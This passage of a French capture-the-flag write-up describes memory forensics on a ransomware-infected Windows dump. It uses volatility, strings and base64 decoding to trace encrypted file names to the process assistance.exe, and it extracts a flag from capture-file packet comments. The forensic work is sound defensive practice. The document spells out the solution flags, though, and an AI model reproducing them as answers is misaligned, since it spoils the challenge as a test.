 0xffffe00011f8f7c8:erienc                           3576      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000126b7848:.exe                             6100      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000115ae848:.exe                             2244      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011302088:exe                               472      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000122aa848:exe                              4452      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000113a2848:e                                 604      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000106bb848:ce.exe                           5208      0  32770 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000125f7848:exe                              4896      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011305188:e                                 480      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012155208:exe                              1360      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000113f2188:exe                               740      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010441608:w.exe                            3192      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00010ef2088:e                                 360      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000127446c8:exe                              5084      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe000126d3088:exe                              2624      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011d1b848:exe                              1776      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001179c848:exe                              1000      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011cc45c8:exe                              1652      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00011fa8848:w.exe                            2168      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012023588:roker.                           3092      0  32768 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe00012910088:exe                              5792      0      0 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001051c848:xe                               5596      0      1 ------ 1970-01-01 00:00:00 UTC+0000
 0xffffe0001287a848:+.exe                            5176      0      1 ------ 1970-01-01 00:00:00 UTC+0000
```

Cette fois il y a les PID, mais pas de nom ni de PPID... Heureusement, il est possible de faire la corrélation via les addresses mémoires. 
Pour l'instant, ceci ne nous avance pas vraiment. Par curiosité, j'ai essayé de trouver des informations directement dans le fichier dmp à grand coup de `strings` et de `grep`, pour voir s'il n'y avait pas moyen de trouver quelque chose d'intéressant. Nous savons que nous cherchons le nom chiffré du fichier `flag.docx`. J'ai donc essayé de retrouver cette string :

```
$ strings mem.dmp | grep "flag.docx" -C 20
...
icon_administrationBlanc_mini.png
aWNvbl9hZG1pbmlzdHJhdGlvbkJsYW5jX21pbmkucG5n
aWNvbl9hZG1pbmlzdHJhdGlvbkJsYW5jX21pbmkucG5njs
aWNvbl9lbnRyZXByaXNlQmxhbmNfbWluaS5wbmc=
aWNvbl9lbnRyZXByaXNlQmxhbmNfbWluaS5wbmc=p.ini
aWNvbl9wYXJ0aWN1bGllckJsYW5jX21pbmkucG5n
aWNvbl9wYXJ0aWN1bGllckJsYW5jX21pbmkucG5np.ini
C:\Users\TNKLSAI3TGT7O9\Documents\ZmxhZy5kb2N4
C:\Users\TNKLSAI3TGT7O9\Documents\ZmxhZy5kb2N4
C:\Users\TNKLSAI3TGT7O9\Documents\flag.docx
C:\Users\TNKLSAI3TGT7O9\Documents\flag.docx
.iniC:\Users\TNKLSAI3TGT7O9\Links\ZGVza3RvcC5pbmk=
C:\Users\TNKLSAI3TGT7O9\Links\ZGVza3RvcC5pbmk=jsC:\Users\TNKLSAI3TGT7O9\Links\desktop.ini
op.iniC:\Users\TNKLSAI3TGT7O9\Links\desktop.ini
C:\Users\TNKLSAI3TGT7O9\Favorites\desktop.ini
niC:\Users\TNKLSAI3TGT7O9\Favorites\desktop.ini
C:\Users\TNKLSAI3TGT7O9\Music\ZGVza3RvcC5pbmk=
C:\Users\TNKLSAI3TGT7O9\Music\ZGVza3RvcC5pbmk=
C:\Users\TNKLSAI3TGT7O9\Music\desktop.ini
op.iniC:\Users\TNKLSAI3TGT7O9\Music\desktop.ini
...
```

On dirait que nous avons ici à la fois les fichiers en clair, et chiffrés en base 64. Pourquoi ne pas essayer d'en déchiffrer ?
```
$ python2 -c "import base64; print base64.b64decode('aWNvbl9hZG1pbmlzdHJhdGlvbkJsYW5jX21pbmkucG5n')"
icon_administrationBlanc_mini.png

$ python2 -c "import base64; print base64.b64decode('aWNvbl9lbnRyZXByaXNlQmxhbmNfbWluaS5wbmc=')"    
icon_entrepriseBlanc_mini.png

$ python2 -c "import base64; print base64.b64decode('ZmxhZy5kb2N4')"    
flag.docx

$ python2 -c "import base64; print base64.b64decode('ZGVza3RvcC5pbmk=')"
desktop.ini
```

On retrouve bien notre `flag.docx`. Après un rapide `strings | grep` avec cette fois la chaine `ZmxhZy5kb2N4`, on tombe sur plusieurs choses intéressantes.
```
ath=C:\Windows\system32;C:\Windows;C:\Windows\System32\Wbem;C:\Windows\System32\WindowsPowerShell\v1.0\
PSModulePath=C:\Program Files\WindowsPowerShell\Modules;C:\Windows\system32\WindowsPowerShell\v1.0\Modules
Renaming C:\Users\TNKLSAI3TGT7O9\Documents\flag.docx to C:\Users\TNKLSAI3TGT7O9\Documents\ZmxhZy5kb2N4
Renaming C:\Users\TNKLSAI3TGT7O9\Links\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Links\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\Favorites\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Favorites\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\Music\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Music\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\OneDrive\desktop.ini to C:\Users\TNKLSAI3TGT7O9\OneDrive\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\Pictures\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Pictures\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\Searches\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Searches\ZGVza3RvcC5pbmk=
Renaming C:\Users\TNKLSAI3TGT7O9\Videos\desktop.ini to C:\Users\TNKLSAI3TGT7O9\Videos\ZGVza3RvcC5pbmk=
C:\Users\TNKLSAI3TGT7O9\Searches\winrt--{S-1-5-21-2377780471-3200203716-3353778491-1000}-.searchconnector-ms
C:\Users\TNKLSAI3TGT7O9\Searches\winrt--{S-1-5-21-2377780471-3200203716-3353778491-1000}-.searchconnector-ms
Renaming C:\Users\Administrateur\Contacts\desktop.ini to C:\Users\Administrateur\Contacts\ZGVza3RvcC5pbmk=
Renaming C:\Users\Administrateur\Desktop\desktop.ini to C:\Users\Administrateur\Desktop\ZGVza3RvcC5pbmk=
Renaming C:\Users\Administrateur\Documents\desktop.ini to C:\Users\Administrateur\Documents\ZGVza3RvcC5pbmk=
Renaming C:\Users\Administrateur\Downloads\desktop.ini to C:\Users\Administrateur\Downloads\ZGVza3RvcC5pbmk=
Renaming C:\Users\Administrateur\Favorites\desktop.ini to C:\Use
```
Un extrait de la sortie standard du ransomware ! Cela confirme une fois pour toute notre hypothèse précédente. Deuxième output intéressante que l'on retrouve à plusieurs reprises :
```desktop-704qvqq
1SPSU(L
1SPS
\TNKLSAI3TGT7O9\Documents\ZmxhZy5kb2N4.chiffr
desktop-704qvqq
1SPSU(L
1SPS
```
Le nom du fichier sur le disque est en fait `b64(nom_original).chiffré`, le 'é' n'étant pas affiché.

En poussant mes recherches, j'ai trouvé quelques petites informations, toutefois inutile pour cette partie du challenge (peut-être pour les autres aussi, mais je suis mal placé pour en parler) :

 - Une clé usb `anssi_usb` a été branchée et montée en `E:`
 - Lorsque le ransomware a fini de chiffrer les fichiers, il affiche "Fait! Lol!" avec l'heure correspondante (ici 22h00:19)
 - Après s'être rendu compte de l'attaque, la victime a fait des recherches sur internet pour comprendre ce qui lui arrive

Cette dernière information m'a indiqué que la victime était active sur la machine au moment des faits et notamment sur internet. En regardant les processus, on peut préciser que c'était sur firefox. Peut-être a-t-elle télécharger malencontreusement le ransomware ? Regardons dans le dossier `Downloads` :
```
Avec strings
$ strings asd.asd | grep Downloads | grep exe
2019-05-08 19:31:35 UTC+0000 2019-05-08 19:31:35 UTC+0000   2019-05-08 19:31:35 UTC+0000   2019-05-08 19:31:35 UTC+0000   Users\TNKLSAI3TGT7O9\Downloads\assistance.exe

Ou volatility
$ volatility -f mem.dmp --profile=Win10x64_15063 mftparser | grep Downloads | grep exe
Volatility Foundation Volatility Framework 2.6.1
2019-05-08 19:31:35 UTC+0000 2019-05-08 19:31:35 UTC+0000   2019-05-08 19:31:35 UTC+0000   2019-05-08 19:31:35 UTC+0000   Users\TNKLSAI3TGT7O9\Downloads\assistance.exe
```

Peut-être est-ce le programme que l'on cherche ? En recoupant avec les output des commandes `pstree` et `psscan` de `volatility`, on retrouve le PID correspondant au processus `assistance.exe`, `5208`.

Le flag est `ECSC{assistance.exe:5208:c9a12b109a58361ff1381fceccdcdcade3ec595a}`.

## Petites notes
Pour celui là, il suffit de cliquer sur l'icone en bas à droite `Open the Capture File Properties Dialog`, *and voilà*.
```
Packet Comments
Frame 118: Cette capture ressemble à une simple navigation légitime.
Frame 874: Cette simple navigation permet de commencer tranquillement. Réassemble les commentaires pour obtenir le flag.
Frame 3188: ECSC{cShl
Frame 4100: e5dO
Frame 4221: KYBfj
Frame 4903: LNzT}
```

Flag : `ECSC{cShle5dOKYBfjLNzT}`

